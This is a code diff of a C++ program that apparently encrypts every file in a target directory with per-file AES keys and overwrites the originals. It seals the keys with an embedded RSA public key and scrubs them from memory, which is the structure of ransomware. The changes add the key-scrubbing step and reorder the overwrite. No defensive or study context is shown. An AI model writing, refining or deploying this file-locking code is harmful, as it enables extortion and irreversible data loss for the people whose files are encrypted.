@@ -40,8 +40,6 @@ const string PRIVATE_KEY_HEX =
 // Encrypting functions
 void aesEncrypt();
 vector<string> getFileNames();
-SecByteBlock generateAESKey();
-SecByteBlock generateAESIV();
 string aesEncryptContents(const SecByteBlock& key, const SecByteBlock& iv, const string& contents);
 string rsaEncrypt(const string& input);
 void storeEncryptedAESData(const string& encryptedEntry);
@@ -70,37 +68,50 @@ void aesEncrypt() {
     vector<string> fileNames;
     fileNames = getFileNames();
 
+    cout << "Public Key:" << endl;
+    cout << PUBLIC_KEY_HEX << endl << endl;
+
     // Iterates through file names and opens and encrypts them one by one
     for (int i = 0; i < fileNames.size(); ++i) {
         string contents = readfileContents(DIRPATH + fileNames.at(i));
 
         // Generates a unique AES key and iv, then uses them to encrypt the contents of the file
-        SecByteBlock key = generateAESKey();
-        SecByteBlock iv = generateAESIV();
+        AutoSeededRandomPool rnd;
+
+        SecByteBlock key(0x00, KEYLENGTH);
+        SecByteBlock iv(AES::BLOCKSIZE);
+        rnd.GenerateBlock(key, key.size());
+        rnd.GenerateBlock(iv, iv.size());
+
         string cipherText = aesEncryptContents(key, iv, contents);
 
-        // Deletes the previous data and writes the encrypted data to the file
-        writeAlteredContents(DIRPATH + fileNames.at(i), cipherText);
+        // Turns the key and iv from SecByteBlock to hex, so that it can be easily read and written
+        string keyHex(stringToHex(string(reinterpret_cast<const char*>(key.data()), key.size())));
+        string ivHex(stringToHex(string(reinterpret_cast<const char*>(iv.data()), iv.size())));
 
-        // Turns the key and iv from SecByteBlock to string, so that it can be stored
-        string keyString(reinterpret_cast<const char*>(key.data()), key.size());
-        string ivString(reinterpret_cast<const char*>(iv.data()), iv.size());
+        // Overwrite the SecByteBlock versions of the key and iv in memory, so they're harder to recover
+        rnd.GenerateBlock(key, key.size());
+        rnd.GenerateBlock(iv, iv.size());
 
-        // Turns the keyString and ivString into hex, so it can be easily read
-        string keyHex = stringToHex(keyString);
-        string ivHex = stringToHex(ivString);
-
-        // Creates the full line of AES data, including the fileName, keyHex, and ivHex,
-        // and encrypts it all using the public RSA key
+        // Creates the full line of AES data, including the fileName, keyHex, and ivHex
         string fullEntry = fileNames[i] + "\t" + keyHex + "\t" + ivHex;
-        string encryptedEntry = rsaEncrypt(fullEntry);
-        storeEncryptedAESData(stringToHex(encryptedEntry));
 
         // Output the file along with its key and iv
         cout << "WRITING:" << endl;
         cout << fileNames[i] << endl;
-        cout << "key: " << keyHex << "\t" << keyString.length() << endl;
-        cout << "iv: " << ivHex << "\t" << ivString.length() << endl << endl;
+        cout << "key: " << keyHex << "\t" << endl;
+        cout << "iv: " << ivHex << "\t" << endl << endl;
+
+        // Overwrite the hex versions of the key and iv in memory, so they're harder to recover
+        keyHex = string(stringToHex(string(reinterpret_cast<const char*>(key.data()), key.size())));
+        ivHex = string(stringToHex(string(reinterpret_cast<const char*>(iv.data()), iv.size())));
+
+        // Encrypts all necessary AES decryption data using the public RSA key and stores it in the keyfile
+        string encryptedEntry = rsaEncrypt(fullEntry);
+        storeEncryptedAESData(stringToHex(encryptedEntry));
+
+        // Deletes the previous data and writes the encrypted data to the file
+        writeAlteredContents(DIRPATH + fileNames.at(i), cipherText);
     }
 }
 
@@ -125,33 +136,6 @@ vector<string> getFileNames() {
     }
 
     return files;
-}
-
-/**
- * Generates a unique AES key and returns it
- */
-SecByteBlock generateAESKey() {
-    AutoSeededRandomPool rnd;
-
-    // Generate a random key
-    SecByteBlock key(0x00, KEYLENGTH);
-    rnd.GenerateBlock(key, key.size());
-
-    return key;
-}
-
-
-/**
- * Generates a unique AES iv and returns it
- */
-SecByteBlock generateAESIV() {
-    AutoSeededRandomPool rnd;
-
-    // Generate a random IV
-    SecByteBlock iv(AES::BLOCKSIZE);
-    rnd.GenerateBlock(iv, iv.size());
-
-    return iv;
 }
 
 
